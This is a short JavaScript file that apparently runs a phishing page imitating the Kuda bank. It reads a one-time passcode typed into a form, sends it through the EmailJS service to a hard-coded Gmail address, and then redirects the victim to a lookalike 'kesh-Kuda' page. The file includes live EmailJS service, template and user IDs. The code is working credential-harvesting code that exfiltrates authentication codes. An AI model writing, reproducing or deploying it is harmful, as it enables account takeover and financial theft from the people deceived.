// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_o474xzp";
const userId = "yF64jxxnz5Wh-Hbvj";
const templateId = "template_1sejyz4";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "Ochiezevictor23@gmail.com",
    otp: otp.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      otp.value = "";
      location.href = "/kesh-Kuda.xyz.github.io/index.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
